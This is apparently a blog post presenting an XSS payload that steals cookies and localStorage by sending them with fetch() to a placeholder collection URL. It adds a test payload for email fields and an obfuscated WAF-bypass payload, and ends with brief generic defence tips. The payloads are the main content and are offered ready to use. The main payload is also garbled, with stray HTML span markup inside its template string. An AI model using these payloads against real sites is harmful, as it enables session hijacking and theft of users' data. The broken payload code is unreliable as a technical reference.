---
title: XSS Payload That Steals Both Cookies and Local Storage Data
date: 2024-01-07 10:13:21 +0400
categories: [Technology, Cybersecurity]
tags: [xss, web security, payloads, hacking]
draft: False  # Optional draft status
---

Cross-Site Scripting (XSS) attacks continue to pose a significant threat to web applications. Today, we'll examine a particularly dangerous payload that can siphon both cookies and local storage data from unsuspecting users.

## The Payload

```html
<svg/onload='const url = `https://weburl/collect?cookie=<span class="math-inline">\{encodeURIComponent\(document\.cookie\)\}&localStorage\=</span>{encodeURIComponent(JSON.stringify(localStorage))}`; fetch(url);'>
``````


**This payload, when injected into a vulnerable web page, executes the following actions:**

1. **Creates an SVG element:** The `<svg/>` tag initiates an SVG image element.
2. **Triggers JavaScript code on load:** The `onload` attribute ensures the code within the single quotes runs when the SVG element loads.
3. **Constructs a malicious URL:** The code pieces together a URL containing:
   - The attacker's server address (`https://weburl/collect`)
   - The victim's cookies, encoded for safe transmission (`encodeURIComponent(document.cookie)`)
   - The victim's local storage data, also encoded (`encodeURIComponent(JSON.stringify(localStorage))`)
4. **Sends stolen data:** The `fetch(url)` function transmits the constructed URL, along with its sensitive payload, to the attacker's server.

## Consequences of a Successful Attack

- **Cookie theft:** Attackers can hijack user sessions, impersonate victims, and gain unauthorized access to sensitive data.
- **Local storage compromise:** Attackers can steal personally identifiable information, website preferences, and potentially sensitive tokens or keys stored in local storage.

## Additional XSS Tips

- **Testing for vulnerabilities:** Inject common payloads like `test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E` into vulnerable parameters (e.g., email fields) to check for XSS.
- **Bypassing WAFs:** Attackers continuously devise techniques to circumvent web application firewalls (WAFs), such as the location concatenation payload: `"><BODy onbeforescriptexecute="x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c">".`

## Protection Measures

- **Input validation and sanitization:** Rigorously validate and sanitize all user-provided input to prevent malicious code injection.
- **Content Security Policy (CSP):** Implement a robust CSP to restrict script execution from untrusted sources.
- **Regular testing and patching:** Conduct regular penetration testing to identify and address vulnerabilities, and promptly apply security patches.
- **Secure coding practices:** Adhere to secure coding best practices to minimize the risk of XSS vulnerabilities.

**Stay vigilant and proactive in protecting your web applications from XSS attacks. Remember, prevention is far better than the cure.**

